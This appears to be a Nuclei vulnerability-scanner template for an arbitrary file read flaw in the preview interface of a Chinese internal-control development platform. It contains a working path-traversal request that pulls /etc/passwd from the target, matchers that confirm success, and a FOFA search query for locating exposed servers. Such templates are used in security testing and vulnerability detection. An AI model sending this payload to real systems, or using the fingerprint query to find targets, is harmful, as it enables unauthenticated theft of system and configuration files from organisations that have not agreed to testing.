http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - root:x
            - /bin/bash
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
id: zhenneikong-preview-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="js/npm.echarts.js"
        真内控国产化平台 preview接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过构造精心设计的请求，成功利用漏洞读取服务器上的任意文件，包括敏感系统文件和应用程序配置文件等。导致系统处于极不安全的状态。
    name: 真内控国产化开发平台 preview 任意文件读取漏洞
    reference:
        - https://superhero.blog.csdn.net/article/details/139842187
    severity: high
    tags:
        - File reading
        - Echarts
        - Kong
